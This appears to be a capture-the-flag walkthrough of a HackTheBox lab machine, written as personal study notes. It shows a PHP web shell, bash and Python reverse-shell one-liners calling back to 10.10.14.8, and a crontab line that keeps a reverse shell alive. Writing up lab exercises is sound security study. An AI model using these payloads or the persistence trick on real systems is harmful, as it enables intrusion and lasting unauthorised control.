# Information gathering

## system network

10.10.10.68

## Nmap Scan Result

``` ba
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Vuln Scan

find phpbash

![image-20221222111812720](D:\OSCP\hackthebox\attachments\image-20221222111812720.png)

upload simple php backdoor into uploads folder

![image-20221222111844563](D:\OSCP\hackthebox\attachments\image-20221222111844563.png)

get webshell, and get the reverse shell

![image-20221222111934262](D:\OSCP\hackthebox\attachments\image-20221222111934262.png)

payload1:

```php+HTML
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

payload2:

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/6001 0>&1'
```

#### Proof

![image-20221222112401634](D:\OSCP\hackthebox\attachments\image-20221222112401634.png)

### Lateral Movement

![image-20221222112453595](D:\OSCP\hackthebox\attachments\image-20221222112453595.png)

*payload*:

```bash
sudo -u scriptmanager /bin/bash
```

*persistence*

```bash
(crontab -l ; echo "*/3 * * * *	/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/6002 0>&1'")|crontab 2> /dev/null
```

### Privilege Escalation

*find crontab task*

![image-20221222113930570](D:\OSCP\hackthebox\attachments\image-20221222113930570.png)

*payload*

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",6003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

*listener*

```bash
nc -lvnp 6003
```

#### proof

![image-20221222114334043](D:\OSCP\hackthebox\attachments\image-20221222114334043.png)

